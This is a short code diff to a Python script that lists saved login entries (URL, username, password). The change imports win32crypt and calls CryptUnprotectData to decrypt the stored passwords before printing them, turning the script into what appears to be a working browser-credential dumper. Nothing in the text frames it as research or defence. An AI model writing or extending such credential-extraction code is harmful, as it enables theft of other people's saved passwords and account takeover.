@@ -6,6 +6,7 @@ import shutil
 import argparse
 import csv
 import sys # For sys.exit
+import win32crypt
 
 # --- Dependencies ---
 try:
@@ -139,7 +140,7 @@ def print_results_console(data):
     for item in data:
         print(f"URL: {item['url']}")
         print(f"User Name: {item['username']}")
-        decrypted_password = item['password'].decode('utf-8', errors='ignore')
+        decrypted_password = win32crypt.CryptUnprotectData(item['password'], None, None, None, 0)
         print(f"Password: {decrypted_password}")
         print("*" * 50)
 
